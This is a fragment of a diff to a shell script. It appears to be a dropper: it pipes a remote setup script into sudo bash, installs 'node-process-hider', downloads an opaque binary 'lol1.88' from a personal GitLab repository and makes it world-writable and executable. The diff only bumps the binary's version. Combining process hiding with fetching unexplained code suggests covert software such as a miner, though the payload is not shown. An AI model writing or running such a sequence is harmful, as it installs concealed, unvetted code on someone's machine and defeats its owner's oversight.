@@ -13,7 +13,7 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.84
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.88
 
 chmod 777 lol1.88
 
